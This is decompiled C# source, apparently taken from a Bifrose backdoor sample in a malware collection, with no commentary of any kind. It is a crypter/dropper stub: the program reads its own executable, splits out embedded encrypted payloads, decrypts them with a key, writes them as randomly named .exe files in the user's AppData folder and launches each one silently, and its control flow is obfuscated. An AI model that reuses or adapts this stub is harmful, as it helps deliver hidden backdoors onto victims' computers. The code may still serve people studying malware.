// Decompiled with JetBrains decompiler
// Type: c
// Assembly: Hurensohn, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 1C815098-DDB6-4137-B390-DF1007A7923D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.gehu-18295050cabfdf7bb0b442b715e1040691184296c20bcc2d4c056069eace7f05.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;

public class c
{
  [DebuggerNonUserCode]
  public c()
  {
  }

  private static int a(int A_0, int A_1) => new Random().Next(A_0, A_1);

  private static string a(int A_0, bool A_1)
  {
label_2:
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    int num1 = checked (A_0 - 1);
    int num2 = 0;
    int num3 = 3;
    while (true)
    {
      switch (num3)
      {
        case 0:
          goto label_11;
        case 1:
          num3 = 2;
          continue;
        case 2:
          if (num2 > num1)
          {
            num3 = 4;
            continue;
          }
          char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
          stringBuilder.Append(ch);
          checked { ++num2; }
          num3 = 1;
          continue;
        case 3:
          if (false)
            goto case 1;
          else
            goto case 1;
        case 4:
          num3 = 5;
          continue;
        case 5:
          if (A_1)
          {
            num3 = 0;
            continue;
          }
          goto label_12;
        default:
          goto label_2;
      }
    }
label_11:
    return stringBuilder.ToString().ToLower();
label_12:
    return stringBuilder.ToString();
  }

  private static string b()
  {
    if (false)
      ;
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Append(c.a(4, true));
    stringBuilder.Append(c.a(1000, 9999));
    stringBuilder.Append(c.a(2, false));
    return stringBuilder.ToString();
  }

  public static void a()
  {
label_2:
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    string Delimiter = "LSBP671gypxw^2wWSyf74*+;z6§3zUA)J19T9::kj80i7Ne3g";
    FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
    string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
    FileSystem.FileGet(1, ref Expression);
    FileSystem.FileClose(1);
    string[] strArray = Strings.Split(Expression, Delimiter);
    string str2 = c.b().ToString() + ".exe";
    string A_1 = strArray[1];
    int num1 = checked (Convert.ToInt32(strArray[2]) + 2);
    int index = 3;
    int num2 = 3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          num2 = 2;
          continue;
        case 1:
          goto label_8;
        case 2:
          if (index <= num1)
          {
            FileSystem.FileOpen(1, str1 + index.ToString() + str2, OpenMode.Binary);
            FileSystem.FilePut(1, m.a(strArray[index], A_1), -1L, false);
            FileSystem.FileClose(1);
            num2 = 4;
            continue;
          }
          num2 = 1;
          continue;
        case 4:
          try
          {
            Process.Start(str1 + index.ToString() + str2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
          num2 = 0;
          continue;
        default:
          goto label_2;
      }
    }
label_8:
    if (false)
      ;
    ProjectData.EndApp();
  }
}
